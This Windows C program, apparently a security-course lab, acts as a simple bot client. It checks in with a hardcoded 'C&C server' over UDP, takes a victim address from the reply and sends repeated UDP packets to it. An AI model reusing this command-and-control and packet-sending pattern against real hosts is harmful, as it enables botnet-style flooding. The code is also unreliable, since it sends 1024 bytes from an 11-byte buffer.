#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <Winsock2.h> //소켓을 윈도우에서 사용할 수 있도록 윈속 헤더 포함 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#pragma comment(lib,"ws2_32.lib")
#define BUFSIZE 1024
#define PORT 10004

int main() {
	WSADATA winsockData; //윈속 초기화 구조체 
	SOCKET serverSocket; // 소켓 구조체 
	SOCKADDR_IN serverAddr; //주소 구조체의 길이를 저장하기 위한 변수 
	SOCKADDR_IN clientAddr; 

	char buf[BUFSIZE]; //송수신에 사용할 버퍼 
	int recvLen; // 수 데이터의 길이 변수 
	int sendLen; // 송신  데이터의 길이 변수 
	int clientSize;
	char msg1[] = "IMHACKER_2020111361"; 
	char msg2[] = "2020111361";

	// 윈속 초기화 함수 (하위버전과의 호환성을 위해 남아있음)
	if (WSAStartup(0x202, &winsockData) == SOCKET_ERROR) { 
		printf("[-] Winsock Initialization failed.\n");
		WSACleanup();
		return 0;
	}
	printf("[+] Winsock Init.\n");
	//주소 구조체 및 데이터 저장 변수 버퍼 초기화 
	memset(&serverAddr, 0, sizeof(serverAddr));
	memset(&clientAddr, 0, sizeof(clientAddr));
	memset(buf, 0, BUFSIZE);

	//서버 주소 구조체 초기화 
	serverAddr.sin_family = AF_INET; // 
	serverAddr.sin_addr.s_addr = inet_addr("114.70.37.17"); // C&C 서버 IP 주소 
	serverAddr.sin_port = htons(PORT); //  C&C 서버 포트주소  10004

	serverSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); // 소켓을 열고, 파일 디스크립터에 의해 데이터를 주고 받게 된다. IPv4, UDP, IPPROTO_UDP
	if (serverSocket == INVALID_SOCKET) {
		printf("[-] Socket creation failed.\n");
		WSACleanup();
		return 0;
	}
	printf("[+] Socket create.\n");


	// C&C서버(114.70.37.17)에 10004번 포트로 IMHACKER_2020111361 전송(UDP)
	sendLen = sendto(serverSocket, msg1, sizeof(msg1), 0,
			(struct sockaddr*)&serverAddr, sizeof(serverAddr));
	if (sendLen != sizeof(msg1)) {
		printf("[-] sendto() error.\n");
		return 0;
	}
	// C&C 서버로부터 데이터를 읽어 들이는 함수 (victim의 IP:PORT )
	clientSize = sizeof(clientAddr);
	recvLen = recvfrom(serverSocket, buf, BUFSIZE, 0,
			(struct sockaddr*)&clientAddr, &clientSize); // (바인드된 소켓의 파일 디스크립터, 수신되는 데이터를 저장할 버퍼 포인터, 버퍼의 길이, 작업 명시 플래그, 호스트의 주소를 저장, 주소정보 구조체의 길이) 
	if (recvLen < 0) {
			printf("[-] recvfrom() error.\n");
			return 0;
	}
	printf("[+] recv msg: %s\n", buf);

	// 공격지 코드를 하드코딩하지 않고, 공격지 주소를 변경해서 보내는 함수 
	int i = 0;
	char* addr2[10] = { NULL, }; // 피해자의 문자열 포인터 배열 
	char* ptr1 = strtok(buf, "_");
	while (ptr1 != NULL) {
		addr2[i] = ptr1; //자른 문자열을 =>  addr2에 저장
		i++;
		ptr1 = strtok(NULL, ":"); //문자열을 잘라서 포인터를 반환한다.
	}
	int port2 = 7777;

	clientAddr.sin_family = AF_INET;
	clientAddr.sin_addr.s_addr = inet_addr(addr2[1]);
	clientAddr.sin_port = htons(port2);

	//UDP 공격을 수행(학번 10번 반복해서 전송) 
	for (int j = 0; j < 10; j++) {
		sendLen = sendto(serverSocket, msg2, BUFSIZE, 0,
			(struct sockaddr*)&clientAddr, sizeof(clientAddr));
		if (sendLen != BUFSIZE) {
			printf("[-] sendto() error.\n");
			return 0;
		}
	}
	//후에 서버로부터 메시지 받아 출력.
	recvLen = recvfrom(serverSocket, buf, BUFSIZE, 0,
		(struct sockaddr*)&clientAddr, &clientSize); // (바인드된 소켓의 파일 디스크립터, 수신되는 데이터를 저장할 버퍼 포인터, 버퍼의 길이, 작업 명시 플래그, 호스트의 주소를 저장, 주소정보 구조체의 길이) 
	if (recvLen < 0) {
		printf("[-] recvfrom() error.\n");
		return 0;
	}
	printf("[+] recv msg: %s\n", buf);

	closesocket(serverSocket);
	WSACleanup();
}